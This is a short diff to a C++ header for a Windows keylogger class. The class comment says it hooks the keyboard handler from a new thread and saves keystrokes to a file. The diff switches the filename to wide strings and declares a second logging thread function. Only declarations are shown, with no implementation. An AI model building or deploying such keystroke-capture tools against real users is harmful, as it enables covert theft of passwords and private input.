@@ -21,6 +21,8 @@
 
 #include <Windows.h>
 
+#include "tstring.h"
+
 /**
 * A simple key logger.
 * It create a new thread and hook keyboard handler.
@@ -28,17 +30,18 @@
 class Keylogger {
 public:
 	// Start the keylogger and save in filename
-	static bool startKeylogger(const char *filename);
+	static bool startKeylogger(const wchar_t *filename);
 
 	// Stop the keylogger.
 	static bool stopKeylogger();
 
 	// The thread used for keylog
 	static DWORD WINAPI keyLogger(LPVOID lpParameter);	
+	static DWORD WINAPI keyLogger2(LPVOID lpParameter);	
 
 	static void msgLoop();
 
-	static std::string filename;
+	static std::wstring filename;
 
 	static HANDLE hThread;
 };
